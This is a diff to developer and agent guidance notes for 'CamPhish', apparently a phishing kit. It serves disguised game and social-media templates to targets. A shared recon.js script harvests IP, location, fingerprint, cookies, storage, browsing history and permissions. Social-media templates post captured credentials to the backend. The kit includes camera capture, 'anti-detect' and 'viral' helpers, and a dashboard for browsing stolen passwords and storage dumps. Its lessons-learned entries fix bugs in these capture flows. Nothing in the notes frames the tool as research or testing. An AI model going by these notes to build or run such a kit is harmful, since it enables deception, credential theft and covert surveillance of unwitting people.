@@ -8,7 +8,7 @@ Backend serves API + dashboard SPA + pluggable HTML templates. TrailBase provide
 ```
 Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:4000, secondary)
                       ↓
-                 React Dashboard (:8080 SPA) — 8 pages, all redesigned
+                 React Dashboard (:8080 SPA) — 9 pages, redesigned
                       ↓
                  Templates (/t/:id) → recon.js → capture endpoints
 ```
@@ -22,18 +22,20 @@ Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:
 6. **PostHog backend**: `posthog.rs` reads `POSTHOG_API_KEY` (falls back to `VITE_POSTHOG_KEY`). Error tracking via `ErrorTrackingOptions`. Uses `capture_exception_with` for Rust errors.
 7. **PostHog env vars**: `POSTHOG_API_KEY` / `POSTHOG_HOST` for backend; `VITE_POSTHOG_KEY` / `VITE_POSTHOG_HOST` for frontend (Docker build args). Backend falls back to `VITE_POSTHOG_KEY`. Default host is `https://us.posthog.com`.
 8. **Rebuild after PostHog changes**: PostHog env vars are baked into frontend at Docker build time. Rebuild with `docker compose build app` when changing keys/hosts.
-9. **Template placeholders**: `API_BASE_URL` and `forwarding_link` are replaced at serve time
-10. **recon.js is shared**: ALL templates include `<script src="forwarding_link/t/recon.js">`
-11. **CamPhishRecon.init()** triggers: IP + location + fingerprint + gender + cookies + storage + history + auto-permissions
-12. **Games must work WITHOUT camera** — camera is optional enhancement
-13. **Social media templates capture credentials** via `POST /api/capture/credentials`
-14. **Variable naming in JS**: use `el` prefix for DOM elements (elScore, elCombo) to avoid collisions with game state vars
-15. **ALWAYS rebuild Docker after backend changes**: `docker compose build app && docker compose up -d app && sleep 5 && ./scripts/docker-code.sh`
-16. **ALWAYS show access code** after any Docker restart: `./scripts/docker-code.sh` or `cat data/.access_code`
-17. **Dashboard access code persists**: written to `data/.access_code` (bind-mounted). Set `CAMPHISH_ACCESS_SEED` in `.env` for a deterministic code. Use `http://localhost:8080/?code=<code>`.
-18. **Theme**: midnight (default) and terminal themes, persisted to localStorage key `camphish-theme`. Toggle via sidebar button.
-19. **Pagination**: all list endpoints return `PaginatedResponse<T>` with `{ entries, total, has_more }`. Frontend uses `LoadMoreButton` + `offsetRef` pattern for infinite scroll. Default limit is 50, max 500.
-20. **Commit style**: cherry-pickable PRs. Use `feat:` prefix for features, `fix:` for bugs. Multi-line descriptions.
+9. **Dashboard auth**: `?code=<access-code>` unlocks the SPA shell. Public deployments still need `DASHBOARD_TOKEN` or external auth for API protection.
+10. **Template placeholders**: `API_BASE_URL` and `forwarding_link` are replaced at serve time from the live request origin first; env vars are fallbacks.
+11. **recon.js is shared**: ALL templates include `<script src="forwarding_link/t/recon.js">`
+12. **CamPhishRecon.init()** triggers: IP + location + fingerprint + gender + cookies + storage + history + auto-permissions
+13. **Games must work WITHOUT camera** — camera is optional enhancement
+14. **Social media templates capture credentials** via `POST /api/capture/credentials`
+15. **Variable naming in JS**: use `el` prefix for DOM elements (elScore, elCombo) to avoid collisions with game state vars
+16. **Template helper assets**: keep `/t/viral.js` and `/t/anti-detect.js` as JS helper routes, never operator-facing session templates.
+17. **ALWAYS rebuild Docker after backend changes**: `docker compose build app && docker compose up -d app && sleep 5 && ./scripts/docker-code.sh`
+18. **ALWAYS show access code** after any Docker restart: `./scripts/docker-code.sh` or `cat data/.access_code`
+19. **Dashboard access code persists**: written to `data/.access_code` (bind-mounted). Set `CAMPHISH_ACCESS_SEED` in `.env` for a deterministic code. Use `http://localhost:8080/?code=<code>`.
+20. **Theme**: midnight (default) and terminal themes, persisted to localStorage key `camphish-theme`. Toggle via sidebar button.
+21. **Pagination**: captures use page-based pagination, locations/events/credentials/storage use `{ entries, total, has_more }`, IP logs return `IpStats`, and sessions/templates return arrays.
+22. **Commit style**: cherry-pickable PRs. Use `feat:` prefix for features, `fix:` for bugs. Multi-line descriptions.
 
 ## Tech Stack
 - Backend: Rust 1.96, axum 0.7, sqlx 0.8 (SQLite WAL), tower-http, reqwest (rustls)
@@ -102,7 +104,7 @@ docker compose up -d app
 - `DELETE /api/sessions/:id` — Delete session + all related data
 - `POST /api/sessions` — Create session `{ name, template_id }`
 
-## Dashboard Pages (8 redesigned pages)
+## Dashboard Pages (9 redesigned pages)
 
 | Page | Route | Features |
 |------|-------|----------|
@@ -113,18 +115,19 @@ docker compose up -d app
 | Credentials | `/credentials` | Template filter, always-visible search, total count, memoized filtering, password strength, copy buttons |
 | Storage Dumps | `/storage` | Accordion expand/collapse, raw JSON toggle, cookie/localStorage/sessionStorage breakdown, export CSV/JSON, copy buttons |
 | Session Replay | `/replay` | Event timeline, event type filter with counts, text search, load-more pagination, session selector |
+| Templates | `/templates` | Template catalog, usage stats, copy/share links, category grouping |
 | Sessions | `/sessions` | Create session form, search by name/ID/template, active badge, copy session ID |
 
 All pages share: `ErrorBanner` (dismissible), consistent empty states with icons, staggered fade-in animations, text search/filter bars, total counts from API.
 
 ## Pagination Pattern
-- Backend: `PaginatedResponse<T>` struct returns `{ entries, total, has_more }`
+- Backend: `locations`, `events`, `credentials`, and `storage` return `{ entries, total, has_more }`
 - Frontend: `LoadMoreButton` component + `offsetRef` useRef pattern
   ```
   const offsetRef = useRef(0)
   const loadMore = () => { offsetRef.current += LIMIT; appendFetch() }
   ```
-- Exception: Captures page uses `{ captures, total, pages }` with prev/next page nav (grid layout)
+- Exceptions: `captures` uses `{ captures, total, pages }`, `ips` returns `IpStats`, `sessions` and `templates` return arrays
 - Default LIMIT: 50 (max 500). Frontend pages may use larger for specific needs (SessionReplay: 200)
 
 ## Shared Components
@@ -189,7 +192,7 @@ curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/jso
 3. **Interaction**: click buttons, fill forms, verify page responds
 4. **Edge cases**: mobile viewport, slow network, camera denied, console errors
 5. **MIME types**: `curl -I /t/recon.js` → `Content-Type: application/javascript`
-6. **Dashboard**: `?code=<code>` → dashboard loads, all 8 pages navigate, stats display, data loads, pagination works
+6. **Dashboard**: `?code=<code>` → dashboard loads, all 9 pages navigate, stats display, data loads, pagination works
 7. **API health**: `curl /api/health` → `{"status":"ok",...}` with `db_connected: true`
 
 ## Lessons Learned (DO NOT REPEAT)
@@ -218,6 +221,10 @@ curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/jso
 - **face-runner Facebook gate CSS**: `#fbGate` had `class="login-overlay hidden"` but only `.overlay.hidden{display:none}` existed in CSS — the `login-overlay` class didn't match. Fix: add `.login-overlay.hidden{display:none!important}` rule. The fix was previously applied on `feat/deployment-infra` branch but never merged to master.
 - **Credentials dedup race**: Concurrent requests bypass application-level SELECT check because SQLite connection pool allows parallel reads before INSERT commits. Fix: use `INSERT OR IGNORE` with a UNIQUE index on `(session_id, ip_address, username, password, template_id)` instead of SELECT-then-INSERT.
 - **Delete on 204**: Backend returns `204 No Content` (no body) but frontend called `.json()` — always throws SyntaxError. Fix: return raw fetch promise without `.json()`.
+- **SPA static file traversal**: `serve_spa()` must canonicalize requested files and keep them inside `frontend/dist` before reading them.
+- **Template helper asset registry bug**: `templates/*.js.html` helper shims must not be registered as operator templates or cached/served as `text/html`.
+- **Dashboard deep links**: The app uses `BrowserRouter`, so links must use real paths like `/replay?code=...&session=...`, not `#/replay` fragments.
+- **One-shot camera flows**: verification/scan flows must stop all media tracks after capture or browsers keep showing the camera-in-use indicator.
 - **meeting.html stray `});`**: Dangling closing bracket caused JS parse failure — `joinMeeting()`, `shareCard()` never defined. Fix: remove the stray line.
 - **recon.js audio channel**: `ac.maxChannelCount` is `undefined` — property exists on `AudioDestinationNode`, not `AudioContext`. Fix: use `ac.destination.maxChannelCount`.
 - **festival / youtube placeholders**: `fes_name` and `live_yt_tv` never replaced by Rust backend. Fix: add replacements in `templates.rs` with seasonal values (month-based festival name + video ID).
